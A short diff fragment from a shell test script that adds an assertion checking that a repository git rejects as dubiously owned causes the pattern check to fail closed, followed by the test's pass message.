+  fails_only_with "$r" "$sym_probe_msg" "a repo git refuses as dubiously owned must fail closed"
 
 echo "PASS: check_patterns_test ($pass assertions)"
